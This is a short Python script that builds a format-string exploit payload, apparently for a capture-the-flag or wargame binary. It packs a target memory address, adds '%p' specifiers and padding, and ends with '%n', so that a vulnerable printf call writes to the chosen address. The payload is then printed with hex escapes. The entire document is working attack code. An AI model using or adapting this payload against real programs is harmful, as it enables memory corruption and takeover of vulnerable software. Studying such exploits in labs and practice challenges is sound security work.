#!/usr/bin/env python3

from struct import pack

def p(x): return pack('<I', x)
def isprint(c): return c >= 0x20 and c <= 0x7e

length_left = 64

m_address = p(0x0804988c)
payload = m_address
length_left -= len(payload)
payload += b"%010p" * 3
length_left -= 10 * 3
payload += length_left * b"A"
payload += b"%n"

for c in payload:
    if isprint(c):
        print(chr(c), end="")
    else:
        print("\\x%02x" % c, end="")
